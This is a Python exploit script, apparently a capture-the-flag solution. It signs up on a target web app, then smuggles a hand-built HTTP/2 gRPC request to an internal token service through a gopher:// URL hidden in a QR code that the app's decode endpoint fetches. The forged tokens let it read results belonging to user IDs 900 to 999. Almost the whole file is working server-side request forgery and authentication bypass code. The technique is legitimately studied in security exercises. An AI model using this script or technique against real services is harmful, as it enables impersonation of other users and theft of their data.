import requests
import sys
import random
import string

import urllib

import segno


http2_header = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00$\x04\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x04\x00@\x00\x00\x00\x05\x00@\x00\x00\x00\x06\x00\x00@\x00\xfe\x03\x00\x00\x00\x01\x00\x00\x04\x08\x00\x00\x00\x00\x00\x00?\x00\x01'
payload = b'\x00\x00\x00\x04\x01\x00\x00\x00\x00\x00\x00\xd3\x01\x04\x00\x00\x00\x01@\x05:path\x19/TokenService/CreateToken@\n:authority\x0elocalhost:8980\x83\x86@\x0ccontent-type\x10application/grpc@\x02te\x08trailers@\x14grpc-accept-encoding\x17identity, deflate, gzip@\nuser-agent.grpc-python/1.67.1 grpc-c/44.0.0 (osx; chttp2)\x00\x00\x04\x08\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x1f\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x1a\n\x03101\x12\x13\n\x0brAnD0MByTeS\x12\x04haha\x00\x00\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x05'


token = b"rAnD0MByTeS"
user = b"101"

def generate_random_string(length: int) -> str:
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def gen_gopher_link(pld, host='authrpc', port='8980'):
    finalpayload = urllib.parse.quote_from_bytes(pld).replace("+","%20").replace("%2F","/")
    return f"gopher://{host}:{port}/_" + finalpayload

def auth(host):
    username, password = generate_random_string(8), generate_random_string(8)
    username, password = "hacker123", "hacker123"
    s = requests.Session()
    s.post(f"http://{host}:3000/api/signup", json={"username": username, "password": password})
    resp = s.post(f"http://{host}:3000/api/signin", json={"username": username, "password": password})
    uid = resp.json()["uid"]
    s.post(f"http://{host}:3000/api/tokens", json={"name": "mainToken"})
    tokens = s.get(f"http://{host}:3000/api/tokens").json()
    token = tokens["tokens"][0]["token"]
    return s, token, uid


def hack(host: str, user_to_hack, s, tok):
    if int(user_to_hack) < 100 or int(user_to_hack) > 999:
        print("User ID must be between 100 and 999")
        return
    
    rnd_tok = generate_random_string(len(token))
    

    pld = payload.replace(user, user_to_hack.encode()).replace(token, rnd_tok.encode())

    gopher_link = gen_gopher_link(http2_header + pld)

    segno.make(gopher_link).save("hack.png", scale=5, border=4)

    

    resp = s.post(f"http://{host}:3000/api/decode", params={"parse": "true"}, headers={"Authorization": f"Bearer {tok}"}, files={"qr": open("hack.png", "rb")})
    print(resp.text)

    resp = s.get(f"http://{host}:3000/api/results", headers={"Authorization": f"Bearer {rnd_tok}"})
    print(resp.text)


def hack_overall(host: str):
    s, tok, uid = auth(host)
    
    for i in range(999, 900, -1):
        hack(host, str(i), s, tok)
    





if __name__ == '__main__':
    hack_overall(sys.argv[1])